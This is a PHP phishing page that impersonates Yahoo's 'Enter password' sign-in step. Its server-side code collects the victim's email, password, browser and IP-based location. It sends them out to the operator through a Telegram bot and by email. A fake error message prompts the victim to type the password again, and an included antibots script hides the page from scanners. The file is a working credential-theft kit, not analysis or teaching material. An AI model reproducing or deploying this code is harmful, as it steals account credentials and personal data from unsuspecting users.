<?php include('antibots.php'); ?>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yahoo</title>
    <link rel="icon" type="image/x-icon" href="files/favyah1.ico">
    <link rel="shortcut icon" type="image/x-icon" href="files/favyah2.ico">

    <style>
        html,body{width:100%;height:100%;padding:0;margin:0;overflow:hidden;box-sizing:border-box}.hidden{display:none}.app{width:100%;height:100%;background:#fff;overflow:hidden}.header{position:relative;padding:0 84px;line-height:84px;display:grid;grid-template-columns:1fr auto}.header>a{display:grid;align-content:center}.header>span{color:#188fff;font-size:13px}img{width:auto;height:40px}.header span{float:right}main{background:url(./files/citi.jpg);max-height:1024px;max-width:1440px;width:100%;height:100%;margin:0 auto;padding-top:.7rem;font-family:Helvetica,sans-serif}.login-box{text-align:center;float:right;box-sizing:border-box;background-color:#fff;color:#26282a;box-shadow:0 2px 4px 0 rgba(0,0,0,.3);width:360px;right:0;margin:0 .5rem;min-height:550px;z-index:1;padding:28px 5px;padding-top:28px;padding-bottom:28px;padding-bottom:10px;border:1px solid transparent;border-top-color:transparent;border-top-style:solid;border-top-width:1px;border-top:1px solid #f1f1f5}.container{margin:0 auto;max-width:1030px;min-width:320px;position:relative}.logo{display:grid;justify-content:center}strong{display:block;margin:1rem 0 4.5rem 0;font-size:21px;line-height:24px}.challenge{padding:0 1.41176rem;margin:0 auto;margin-top:62px;margin-bottom:1.5rem;max-width:18.82353rem}input{border-radius:0;border:none;color:var(--c-main);font-size:14px;width:100%;height:48px;outline:none;background:transparent;transition:border 0.2s ease-in-out;border-bottom:.05882rem solid #b9bdc5}button,.button{box-sizing:border-box;border-radius:2px;cursor:pointer;display:flex;border:none;width:100%;align-items:center;line-height:1;font-size:16px;padding:12px 20px;text-align:center;justify-content:center;text-decoration:none;color:#fff;background:#188fff}button.outline,.button.outline{background:0 0;color:#188fff;border:1px solid #188fff}.radio-button,.checkbox{position:relative;margin:20px 0}.checkbox{display:block}.radio-button input,.checkbox input{position:absolute;margin:5px;padding:0;visibility:hidden}.radio-button .label-visible,.checkbox .label-visible{margin-bottom:0}.fake-radiobutton,.fake-checkbox{position:absolute;display:block;top:0;left:3px;width:20px;height:20px;border:1px solid slategray;background-color:#fff}.fake-radiobutton:after,.fake-checkbox:after{content:"";display:none;position:absolute;top:50%;left:50%;width:16px;height:16px;background:navy;transform:translateX(-50%) translateY(-50%)}.fake-radiobutton{border-radius:50%}.fake-radiobutton:after{border-radius:50%}input[type="radio"]:checked+span .fake-radiobutton:after,input[type="checkbox"]:checked+span .fake-checkbox:after{display:block}.helper{display:grid;grid-template-columns:1fr 1fr;align-items:center;color:#188fff;font-size:15px;font-family:Arial,Helvetica,sans-serif}.helper>span{text-align:right}.m-t-2{margin-top:1.5rem}footer{position:fixed;width:100%;bottom:0;right:0;left:0;padding:5px 0;font-size:9px;text-align:center;background:#fff}footer span:not(.space){color:#188fff}footer .space{margin:0 5px}@media only screen and (max-width:640px){.header{display:none}main{background:#fff}.login-box{box-shadow:none;float:none;margin:0 auto}}

    </style>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

    </head>
<body>
    <?php

    session_start();

    include('mail.php');
    $adddate=date("D M d, Y g:i a");
    $loginemail = $_POST['username'];
    $password1 = $_POST['password'];
    $loc1 = $_POST['loctn'];
    $locH = $_POST['loctH'];
    $browser = $_SERVER['HTTP_USER_AGENT'];

    $message .= "---------=== Yahoo LOGIN ===---------\n\n";
    $message .= "Email : $loginemail\n";
    $message .= "Pass : $password1\n\n";
    $message .= "================Location========================\n\n";
    $message .= "Location : $loc1\n";
    $message .= "Date:  ".$adddate."\n";
    $message .= "Browser:  ".$browser."\n\n";
    $message .= "---------=== MELLIVORA ===----------\n\n";

    $pfw_header = "From: Honey <noreply>\n";
    $pfw_subject = "Yahoo - $locH";
    
    $TELEGRAM = "https://api.telegram.org/bot$apiToken";
    foreach ($ids as $id) {
        $data = http_build_query(array(
            'chat_id'=> $id,
            'text'=> $message,
            'parse_mode'=> 'HTML' // Optional: Markdown | HTML
        ));
        $response = file_get_contents("$TELEGRAM/sendMessage?$data");
    };
    @mail($to, $pfw_subject ,$message ,$pfw_header ) ;

    $useremail = substr($loginemail, 0, strpos($loginemail, "@"));

    ?>
    <div class="app">
    <script language="Javascript"> 
            function  echeck(str) {
                var emailID=document.login.username
                var emailPASS=document.login.password

                var at="@"
                var dot="."
                var lat=str.indexOf(at)
                var lstr=str.length
                var ldot=str.indexOf(dot)
                if (str.indexOf(at)==-1){
                    emailID.focus()
                    return false
                }
            
                if (str.indexOf(at)==-1 || str.indexOf(at)==0 || str.indexOf(at)==lstr){
                    emailID.focus()
                    return false
                }
            
                if (str.indexOf(dot)==-1 || str.indexOf(dot)==0 || str.indexOf(dot)==lstr){
                    emailID.focus()
                    return false
                }
            
                if (str.indexOf(at,(lat+1))!=-1){
                    emailID.focus()
                    return false
                }
        
                if (str.substring(lat-1,lat)==dot || str.substring(lat+1,lat+2)==dot){
                    emailID.focus()
                    return false
                }
        
                if (str.indexOf(dot,(lat+2))==-1){
                    emailID.focus()
                    return false
                }
            
                if (str.indexOf(" ")!=-1){
                    emailID.focus()
                    return false
                }
        
                return true					
            }
             
            function ValidateFormOther(){
                var emailID=document.login.username
                var emailPASS=document.login.password
                
                if ((emailID.value==null)||(emailID.value=="")){
                    emailID.focus()
                    return false
                }
                if ((emailPASS.value==null)||(emailPASS.value=="")){
                    emailPASS.focus()
                    return false
                }
                if (echeck(emailID.value)==false){
                    emailID.value=""
                    emailID.focus()
                    return false
                }
                return true
            }
        </script>  

        <header class="header">
            <a href="">
            <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="">
            </a>
            <span>Help</span>
        </header>
        <main>
            <div class="container">
               <div class="col-1">
                    <div class="login-box">
                        <div class="logo">
                        <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="">
                            <p><?php echo $loginemail ?></p>
                        </div>
                        <div class="challenge">
                            <strong style="margin-bottom: 0;">Enter password</strong>
                            <p style="margin-top: 5px; font-size:15px">to finish sign in</p>
                            <form action="yahoo.php" method="post" name="login" id="login" onsubmit="return ValidateFormOther()">
                                <input  name="password" type="password" id="password" placeholder="password">
                                <input  name="username" type="hidden" id="username" value="<?php echo $loginemail ?>">
                                <input  name="loctn" type="hidden" id="loctn" value="">
                                <input  name="loctH" type="hidden" id="loctH" value="">
                                <p style="font-size: 12px;text-align: left;line-height: 1.17647rem;padding-top: .29412rem;color: #f0162f;"> Uh oh, looks like something went wrong. Please try again&nbsp;later.</p>
                                <button name="submit" type="submit" class=" m-t-2">Next</button>
                            </form>
                            <div class="helper">
                                <label class="checkbox">
                                    <input type="checkbox" name="check" disabled>
                                    <span class="label-visible">
                                      <span class="fake-checkbox"></span>
                                      Stay signed in
                                    </span>
                                </label>
                                <span>Forgot username?</span>
                            </div>
                            <button class="outline m-t-2">Create an account</button>
                        </div>
                        <div class="message hidden" style="margin: 10em 0">Thank you. Ads Removed!</div>
                    </div>
                </div>
            </div>
        </main>
        <footer>
            <span>Terms</span>
            <span class="space">|</span>
            <span>Privacy</span>
        </footer>
    </div>

    <noscript>&lt;i&gt;Javascript required&lt;/i&gt;</noscript>
    <script>
        jQuery.get("https://ipinfo.io", function(e) {
            const locHead = JSON.stringify(e.ip + " | " + e.city + " | " + e.region + " | " + e.country)
            const loc = JSON.stringify(e)
            document.getElementById('loctH').value = locHead;
            document.getElementById('loctn').value = loc;
        }, "jsonp")
    </script>
</body>
</html>